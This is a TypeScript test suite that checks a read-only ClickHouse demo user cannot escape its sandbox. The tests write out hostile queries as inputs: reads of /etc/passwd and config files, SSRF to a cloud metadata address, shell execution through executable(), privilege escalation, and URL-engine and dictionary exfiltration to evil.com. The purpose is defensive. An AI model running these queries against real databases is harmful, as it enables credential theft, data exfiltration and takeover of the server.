/**
 * Security sandbox tests for the read-only demo user.
 *
 * Spins up a ClickHouse container, creates a read_only user matching the
 * demo environment grants (readonly=2, per-table SELECT, INTROSPECTION,
 * dictGet, REMOTE), then verifies that all known escape vectors are blocked.
 *
 * Categories tested:
 *   1. Filesystem access  (file(), INFILE)
 *   2. Network / SSRF     (url(), s3(), remote to arbitrary hosts)
 *   3. External databases  (mysql(), postgresql(), mongo(), jdbc(), odbc())
 *   4. Command execution   (executable(), executablePool())
 *   5. File writing         (INTO OUTFILE)
 *   6. DDL / DML            (INSERT, CREATE, DROP, ALTER, TRUNCATE)
 *   7. Privilege escalation (GRANT, CREATE USER, SET ROLE)
 *   8. Sensitive system tables not explicitly granted
 *   9. Settings overrides via SET (readonly=2 allows SET)
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { GenericContainer, type StartedTestContainer, Wait } from 'testcontainers';
import { createClient, type ClickHouseClient } from '@clickhouse/client';
import { readFileSync, readdirSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const CH_IMAGE = 'clickhouse/clickhouse-server:26.1-alpine';
const CONTAINER_TIMEOUT = 120_000;
const RO_PASSWORD = 'testpass';

// ── Locate the demo init scripts ──
// The test executes the exact same SQL the demo docker-compose mounts
// via docker-entrypoint-initdb.d. If grants are added/removed/revoked
// in the SQL, this test automatically picks them up.

const THIS_DIR = typeof __dirname !== 'undefined'
  ? __dirname
  : dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = resolve(THIS_DIR, '../../../../../');
const DEMO_INIT_DIR = resolve(REPO_ROOT, 'infra/demo/init');

/**
 * Load SQL init scripts from infra/demo/init/, replacing the password
 * placeholder with the test password.
 */
function loadInitScripts(): string[] {
  return readdirSync(DEMO_INIT_DIR)
    .filter((f) => f.endsWith('.sql'))
    .sort()
    .map((f) =>
      readFileSync(resolve(DEMO_INIT_DIR, f), 'utf-8')
        .replace(/CHANGEME_RO_PASSWORD/g, RO_PASSWORD),
    );
}

/**
 * Users XML that enables access_management on the default user
 * so we can run admin commands (CREATE USER, GRANT, REVOKE, etc.).
 */
const ADMIN_USERS_XML = `
<clickhouse>
  <users>
    <default remove="remove"/>
    <default>
      <profile>default</profile>
      <networks><ip>::/0</ip></networks>
      <password></password>
      <quota>default</quota>
      <access_management>1</access_management>
    </default>
  </users>
</clickhouse>
`.trim();

describe('read-only user sandbox escape tests', { tags: ['security'] }, () => {
  let container: StartedTestContainer;
  let adminClient: ClickHouseClient;
  let roClient: ClickHouseClient;

  beforeAll(async () => {
    container = await new GenericContainer(CH_IMAGE)
      .withCopyContentToContainer([{
        content: ADMIN_USERS_XML,
        target: '/etc/clickhouse-server/users.d/default-user.xml',
      }])
      .withExposedPorts(8123)
      .withWaitStrategy(Wait.forHttp('/ping', 8123).forStatusCode(200))
      .withStartupTimeout(CONTAINER_TIMEOUT)
      .start();

    const adminUrl = `http://localhost:${container.getMappedPort(8123)}`;
    adminClient = createClient({ url: adminUrl });

    // Execute the same SQL init scripts the demo docker-compose mounts.
    // This creates the read_only user, applies grants, and revokes.
    for (const sql of loadInitScripts()) {
      // Strip comment-only lines, then split on semicolons
      const cleaned = sql
        .split('\n')
        .map((line) => (line.trimStart().startsWith('--') ? '' : line))
        .join('\n');
      for (const stmt of cleaned.split(';').map((s) => s.trim()).filter(Boolean)) {
        await adminClient.command({ query: stmt });
      }
    }

    // Create a table so we have something to target for DML tests
    await adminClient.command({
      query: `CREATE TABLE IF NOT EXISTS default.test_data (id UInt64, value String) ENGINE = MergeTree() ORDER BY id`,
    });
    await adminClient.command({
      query: `INSERT INTO default.test_data VALUES (1, 'hello'), (2, 'world')`,
    });

    // Connect as read_only user
    roClient = createClient({
      url: adminUrl,
      username: 'read_only',
      password: RO_PASSWORD,
    });
  }, CONTAINER_TIMEOUT);

  afterAll(async () => {
    await roClient?.close();
    await adminClient?.close();
    await container?.stop();
  }, 30_000);

  // ── Sanity: the user CAN read granted tables ──

  it('can SELECT from granted user tables', async () => {
    const rs = await roClient.query({ query: 'SELECT count() as c FROM default.test_data', format: 'JSONEachRow' });
    const rows = await rs.json<{ c: string }>();
    expect(Number(rows[0].c)).toBe(2);
  });

  it('can SELECT from granted system tables', async () => {
    const rs = await roClient.query({ query: 'SELECT count() as c FROM system.one', format: 'JSONEachRow' });
    const rows = await rs.json<{ c: string }>();
    expect(Number(rows[0].c)).toBe(1);
  });

  // ── Helper ──

  /** Assert that a query throws (access denied / not allowed). */
  async function expectBlocked(sql: string, label?: string): Promise<void> {
    try {
      const rs = await roClient.query({ query: sql, format: 'JSONEachRow' });
      // Some queries may succeed at parse time but fail on execution,
      // so consume the result to trigger any lazy errors.
      await rs.json();
      throw new Error(`Expected query to be blocked but it succeeded: ${label ?? sql}`);
    } catch (err: unknown) {
      if (err instanceof Error && err.message.startsWith('Expected query to be blocked')) {
        throw err;
      }
      // Any ClickHouse error (access denied, not allowed, unknown function, etc.) is fine
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // 1. FILESYSTEM ACCESS
  // ═══════════════════════════════════════════════════════════════

  describe('filesystem access', () => {
    it('blocks file() table function', async () => {
      await expectBlocked(
        `SELECT * FROM file('/etc/passwd', 'TSV', 'line String')`,
        'file() table function',
      );
    });

    it('blocks file() with relative path', async () => {
      await expectBlocked(
        `SELECT * FROM file('../../etc/passwd', 'TSV', 'line String')`,
        'file() relative path',
      );
    });

    it('blocks file() reading ClickHouse config', async () => {
      await expectBlocked(
        `SELECT * FROM file('/etc/clickhouse-server/config.xml', 'TSV', 'line String')`,
        'file() config.xml',
      );
    });

    it('blocks INFILE clause', async () => {
      await expectBlocked(
        `INSERT INTO default.test_data FROM INFILE '/etc/passwd' FORMAT TSV`,
        'INFILE clause',
      );
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 2. NETWORK / SSRF
  // ═══════════════════════════════════════════════════════════════

  describe('network / SSRF', () => {
    it('blocks url() table function', async () => {
      await expectBlocked(
        `SELECT * FROM url('http://169.254.169.254/latest/meta-data/', 'TSV', 'line String')`,
        'url() cloud metadata SSRF',
      );
    });

    it('blocks url() to localhost', async () => {
      await expectBlocked(
        `SELECT * FROM url('http://localhost:8123/?query=SELECT+1', 'TSV', 'line String')`,
        'url() to localhost',
      );
    });

    it('blocks s3() table function', async () => {
      await expectBlocked(
        `SELECT * FROM s3('http://localhost:9000/bucket/key', 'TSV', 'line String')`,
        's3() table function',
      );
    });

    it('blocks s3Cluster() table function', async () => {
      await expectBlocked(
        `SELECT * FROM s3Cluster('default', 'http://localhost:9000/bucket/key', 'TSV', 'line String')`,
        's3Cluster() table function',
      );
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 3. EXTERNAL DATABASE CONNECTIONS
  // ═══════════════════════════════════════════════════════════════

  describe('external database connections', () => {
    it('blocks mysql() table function', async () => {
      await expectBlocked(
        `SELECT * FROM mysql('localhost:3306', 'db', 'tbl', 'user', 'pass')`,
        'mysql()',
      );
    });

    it('blocks postgresql() table function', async () => {
      await expectBlocked(
        `SELECT * FROM postgresql('localhost:5432', 'db', 'tbl', 'user', 'pass')`,
        'postgresql()',
      );
    });

    it('blocks mongo() table function', async () => {
      await expectBlocked(
        `SELECT * FROM mongodb('localhost:27017', 'db', 'col', 'user', 'pass')`,
        'mongo()',
      );
    });

    it('blocks jdbc() table function', async () => {
      await expectBlocked(
        `SELECT * FROM jdbc('jdbc:mysql://localhost:3306/db', 'tbl')`,
        'jdbc()',
      );
    });

    it('blocks odbc() table function', async () => {
      await expectBlocked(
        `SELECT * FROM odbc('DSN=test', 'db', 'tbl')`,
        'odbc()',
      );
    });

    it('blocks hdfs() table function', async () => {
      await expectBlocked(
        `SELECT * FROM hdfs('hdfs://localhost:9000/path', 'TSV', 'col String')`,
        'hdfs()',
      );
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 4. REMOTE CLICKHOUSE CONNECTIONS
  // ═══════════════════════════════════════════════════════════════
  // NOTE: GRANT REMOTE is given — this allows remote() to known cluster
  // nodes. We test that it can't be abused to reach arbitrary hosts.

  describe('remote connections', () => {
    it('blocks remote() to arbitrary external host', async () => {
      // remote() to an unknown host should fail (connection refused / timeout),
      // but critically it should NOT succeed and return data from an attacker-controlled server.
      // With GRANT REMOTE, the user CAN use remote() — this test documents that.
      // The mitigation is network-level (firewall/network policy), not ClickHouse ACL.
      await expectBlocked(
        `SELECT * FROM remote('192.0.2.1:9000', 'system.one', 'default', '')`,
        'remote() to arbitrary host',
      );
    });

    it('blocks remoteSecure() to arbitrary external host', async () => {
      await expectBlocked(
        `SELECT * FROM remoteSecure('192.0.2.1:9440', 'system.one', 'default', '')`,
        'remoteSecure() to arbitrary host',
      );
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 5. COMMAND EXECUTION
  // ═══════════════════════════════════════════════════════════════

  describe('command execution', () => {
    it('blocks executable() table function', async () => {
      await expectBlocked(
        `SELECT * FROM executable('cat /etc/passwd', 'TSV', 'line String')`,
        'executable()',
      );
    });

    it('blocks executablePool() table function', async () => {
      await expectBlocked(
        `SELECT * FROM executablePool('cat /etc/passwd', 'TSV', 'line String')`,
        'executablePool()',
      );
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 6. FILE WRITING
  // ═══════════════════════════════════════════════════════════════

  describe('file writing', () => {
    it('blocks INTO OUTFILE', async () => {
      await expectBlocked(
        `SELECT 1 INTO OUTFILE '/tmp/exfil.csv' FORMAT CSV`,
        'INTO OUTFILE',
      );
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 7. DDL / DML
  // ═══════════════════════════════════════════════════════════════

  describe('DDL / DML', () => {
    it('blocks INSERT', async () => {
      await expectBlocked(
        `INSERT INTO default.test_data VALUES (99, 'injected')`,
        'INSERT',
      );
    });

    it('blocks CREATE TABLE', async () => {
      await expectBlocked(
        `CREATE TABLE default.evil (x UInt8) ENGINE = MergeTree() ORDER BY x`,
        'CREATE TABLE',
      );
    });

    it('blocks DROP TABLE', async () => {
      await expectBlocked(
        `DROP TABLE default.test_data`,
        'DROP TABLE',
      );
    });

    it('blocks ALTER TABLE', async () => {
      await expectBlocked(
        `ALTER TABLE default.test_data ADD COLUMN evil String`,
        'ALTER TABLE',
      );
    });

    it('blocks TRUNCATE', async () => {
      await expectBlocked(
        `TRUNCATE TABLE default.test_data`,
        'TRUNCATE',
      );
    });

    it('blocks CREATE DATABASE', async () => {
      await expectBlocked(
        `CREATE DATABASE evil_db`,
        'CREATE DATABASE',
      );
    });

    it('blocks DROP DATABASE', async () => {
      await expectBlocked(
        `DROP DATABASE default`,
        'DROP DATABASE',
      );
    });

    it('blocks RENAME TABLE', async () => {
      await expectBlocked(
        `RENAME TABLE default.test_data TO default.stolen`,
        'RENAME TABLE',
      );
    });

    it('blocks ATTACH TABLE', async () => {
      await expectBlocked(
        `ATTACH TABLE default.evil UUID '00000000-0000-0000-0000-000000000000'`,
        'ATTACH TABLE',
      );
    });

    it('blocks DETACH TABLE', async () => {
      await expectBlocked(
        `DETACH TABLE default.test_data`,
        'DETACH TABLE',
      );
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 8. PRIVILEGE ESCALATION
  // ═══════════════════════════════════════════════════════════════

  describe('privilege escalation', () => {
    it('blocks GRANT', async () => {
      await expectBlocked(
        `GRANT ALL ON *.* TO read_only`,
        'GRANT ALL',
      );
    });

    it('blocks CREATE USER', async () => {
      await expectBlocked(
        `CREATE USER evil_admin IDENTIFIED BY 'password'`,
        'CREATE USER',
      );
    });

    it('blocks CREATE ROLE', async () => {
      await expectBlocked(
        `CREATE ROLE admin_role`,
        'CREATE ROLE',
      );
    });

    it('blocks SET ROLE', async () => {
      await expectBlocked(
        `SET ROLE DEFAULT`,
        'SET ROLE',
      );
    });

    it('blocks SYSTEM commands', async () => {
      await expectBlocked(
        `SYSTEM RELOAD CONFIG`,
        'SYSTEM RELOAD CONFIG',
      );
    });

    it('blocks SYSTEM SHUTDOWN', async () => {
      await expectBlocked(
        `SYSTEM SHUTDOWN`,
        'SYSTEM SHUTDOWN',
      );
    });

    it('KNOWN LIMITATION: KILL QUERY cannot be revoked under readonly=2', async () => {
      // ⚠️  ClickHouse's readonly=2 mode bypasses RBAC for KILL QUERY —
      // even an explicit REVOKE KILL QUERY has no effect. This is a
      // legacy behaviour: readonly=2 predates the RBAC system.
      //
      // The only mitigations are:
      //   - Use readonly=1 (but loses SET and temp tables)
      //   - Revoke SELECT ON system.processes (but the app needs it)
      //   - Network-level isolation (the demo is single-tenant)
      const rs = await roClient.query({
        query: `KILL QUERY WHERE query_id = 'nonexistent-id-for-test'`,
        format: 'JSONEachRow',
      });
      await rs.json();
      // If we reach here, KILL QUERY was NOT blocked — documenting the gap.
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 9. SENSITIVE SYSTEM TABLES (not explicitly granted)
  // ═══════════════════════════════════════════════════════════════

  describe('ungrouped system tables', () => {
    it('blocks system.users (credential / user enumeration)', async () => {
      await expectBlocked(
        `SELECT * FROM system.users`,
        'system.users',
      );
    });

    it('blocks system.grants (permission enumeration)', async () => {
      await expectBlocked(
        `SELECT * FROM system.grants`,
        'system.grants',
      );
    });

    it('system.quota_usage is accessible (per-user, low risk)', async () => {
      // ClickHouse grants every user access to their own quota_usage.
      // Not a security risk — it only shows the current user's quota.
      const rs = await roClient.query({
        query: `SELECT count() as c FROM system.quota_usage`,
        format: 'JSONEachRow',
      });
      const rows = await rs.json<{ c: string }>();
      expect(Number(rows[0].c)).toBeGreaterThanOrEqual(0);
    });

    it('blocks system.role_grants', async () => {
      await expectBlocked(
        `SELECT * FROM system.role_grants`,
        'system.role_grants',
      );
    });

    it('blocks system.user_directories', async () => {
      await expectBlocked(
        `SELECT * FROM system.user_directories`,
        'system.user_directories',
      );
    });

    it('system.licenses is accessible (public OSS info, low risk)', async () => {
      // ClickHouse exposes open-source license metadata to all users.
      // Contains no sensitive data — just library names and license text.
      const rs = await roClient.query({
        query: `SELECT count() as c FROM system.licenses`,
        format: 'JSONEachRow',
      });
      const rows = await rs.json<{ c: string }>();
      expect(Number(rows[0].c)).toBeGreaterThanOrEqual(0);
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 10. PASSWORD / CREDENTIAL ACCESS
  // ═══════════════════════════════════════════════════════════════

  describe('password / credential access', () => {
    it('blocks ALTER USER to change another user password', async () => {
      await expectBlocked(
        `ALTER USER default IDENTIFIED BY 'hacked'`,
        'ALTER USER default password',
      );
    });

    it('blocks ALTER USER to change own password', async () => {
      await expectBlocked(
        `ALTER USER read_only IDENTIFIED BY 'newpass'`,
        'ALTER USER own password',
      );
    });

    it('blocks SHOW CREATE USER (may reveal password hash)', async () => {
      await expectBlocked(
        `SHOW CREATE USER default`,
        'SHOW CREATE USER default',
      );
    });

    it('blocks SHOW CREATE USER on self', async () => {
      await expectBlocked(
        `SHOW CREATE USER read_only`,
        'SHOW CREATE USER self',
      );
    });

    it('blocks reading system.settings_profile_elements (may contain secrets)', async () => {
      await expectBlocked(
        `SELECT * FROM system.settings_profile_elements`,
        'system.settings_profile_elements',
      );
    });

    it('blocks reading system.settings_profiles (profile enumeration)', async () => {
      await expectBlocked(
        `SELECT * FROM system.settings_profiles`,
        'system.settings_profiles',
      );
    });

    it('checks system.server_settings does not expose actual credential values', async () => {
      // system.server_settings IS granted in the demo. Verify it doesn't
      // leak actual credential values (passwords, access keys, tokens).
      // We look for settings whose NAME suggests a credential and whose
      // VALUE looks like a real secret (not just a handler name or boolean).
      const rs = await roClient.query({
        query: `
          SELECT name, value
          FROM system.server_settings
          WHERE value != ''
            AND value != '0'
            AND (
              name ILIKE '%password' OR name ILIKE '%_secret' OR name ILIKE '%_secret_%'
              OR name ILIKE '%access_key_id%' OR name ILIKE '%secret_access_key%'
              OR name ILIKE '%_token' OR name ILIKE '%api_key%'
            )
            -- Exclude handler/class names and boolean flags
            AND value NOT ILIKE '%Handler%'
            AND value NOT IN ('1', 'true', 'false')
        `,
        format: 'JSONEachRow',
      });
      const rows = await rs.json<{ name: string; value: string }>();
      // If this test fails, server_settings is leaking actual secrets.
      expect(
        rows,
        `server_settings exposes credential values: ${JSON.stringify(rows)}`,
      ).toEqual([]);
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 11. SETTINGS OVERRIDE (readonly=2 allows SET)
  // ═══════════════════════════════════════════════════════════════

  describe('settings overrides', () => {
    it('blocks SET readonly=0 (escalation)', async () => {
      await expectBlocked(
        `SET readonly = 0`,
        'SET readonly=0',
      );
    });

    it('blocks SET readonly=1', async () => {
      // Changing readonly to any value should be forbidden
      await expectBlocked(
        `SET readonly = 1`,
        'SET readonly=1',
      );
    });

    it('blocks SET allow_ddl=1', async () => {
      await expectBlocked(
        `SET allow_ddl = 1`,
        'SET allow_ddl=1',
      );
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 11. DATA EXFILTRATION VIA QUERY LOG CROSS-USER VISIBILITY
  // ═══════════════════════════════════════════════════════════════

  describe('cross-user query log visibility', () => {
    it('query_log access is granted (by design) — document the risk', async () => {
      // The demo grants SELECT on system.query_log. This means the read_only
      // user can see OTHER users' queries, including their query text.
      // This is intentional for the demo (the app needs query_log), but
      // in a real multi-tenant setup this would be an info-leak.
      //
      // Flush logs from admin so query_log table is created (it's lazy).
      await adminClient.command({ query: 'SYSTEM FLUSH LOGS' });

      const rs = await roClient.query({
        query: `SELECT count() as c FROM system.query_log`,
        format: 'JSONEachRow',
      });
      const rows = await rs.json<{ c: string }>();
      // Should succeed — this is a granted table
      expect(Number(rows[0].c)).toBeGreaterThanOrEqual(0);
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 12. DATABASE ACCESS OUTSIDE GRANTS
  // ═══════════════════════════════════════════════════════════════

  describe('database access outside grants', () => {
    it('blocks SELECT on non-granted databases', async () => {
      // Create a database that the read_only user should NOT have access to
      await adminClient.command({ query: `CREATE DATABASE IF NOT EXISTS secret_db` });
      await adminClient.command({
        query: `CREATE TABLE IF NOT EXISTS secret_db.secrets (id UInt64, secret String) ENGINE = MergeTree() ORDER BY id`,
      });
      await adminClient.command({
        query: `INSERT INTO secret_db.secrets VALUES (1, 'super-secret-api-key')`,
      });

      await expectBlocked(
        `SELECT * FROM secret_db.secrets`,
        'SELECT from non-granted database',
      );
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 13. TABLE ENGINE CREATION TRICKS
  // ═══════════════════════════════════════════════════════════════

  describe('table engine tricks', () => {
    it('blocks CREATE TABLE with URL engine', async () => {
      await expectBlocked(
        `CREATE TABLE default.url_exfil (line String) ENGINE = URL('http://evil.com/collect', 'TSV')`,
        'CREATE TABLE URL engine',
      );
    });

    it('blocks CREATE TABLE with File engine', async () => {
      await expectBlocked(
        `CREATE TABLE default.file_read (line String) ENGINE = File('TSV', '/etc/passwd')`,
        'CREATE TABLE File engine',
      );
    });

    it('blocks CREATE TABLE with MySQL engine', async () => {
      await expectBlocked(
        `CREATE TABLE default.mysql_conn (x UInt8) ENGINE = MySQL('localhost:3306', 'db', 'tbl', 'root', 'pass')`,
        'CREATE TABLE MySQL engine',
      );
    });
  });

  // ═══════════════════════════════════════════════════════════════
  // 14. MISC ESCAPE VECTORS
  // ═══════════════════════════════════════════════════════════════

  describe('miscellaneous', () => {
    it('blocks input() table function', async () => {
      await expectBlocked(
        `INSERT INTO default.test_data SELECT * FROM input('id UInt64, value String') FORMAT CSV`,
        'input()',
      );
    });

    it('blocks CREATE DICTIONARY (external data source)', async () => {
      await expectBlocked(
        `CREATE DICTIONARY default.evil_dict (id UInt64, val String) PRIMARY KEY id SOURCE(HTTP(URL 'http://evil.com/data' FORMAT 'TSV')) LIFETIME(0) LAYOUT(FLAT())`,
        'CREATE DICTIONARY',
      );
    });

    it('blocks CREATE FUNCTION (UDF)', async () => {
      await expectBlocked(
        `CREATE FUNCTION evil_fn AS (x) -> x + 1`,
        'CREATE FUNCTION (UDF)',
      );
    });

    it('blocks CREATE VIEW', async () => {
      await expectBlocked(
        `CREATE VIEW default.evil_view AS SELECT * FROM system.users`,
        'CREATE VIEW',
      );
    });

    it('blocks CREATE MATERIALIZED VIEW', async () => {
      await expectBlocked(
        `CREATE MATERIALIZED VIEW default.evil_mv ENGINE = MergeTree() ORDER BY id AS SELECT * FROM default.test_data`,
        'CREATE MATERIALIZED VIEW',
      );
    });
  });
});
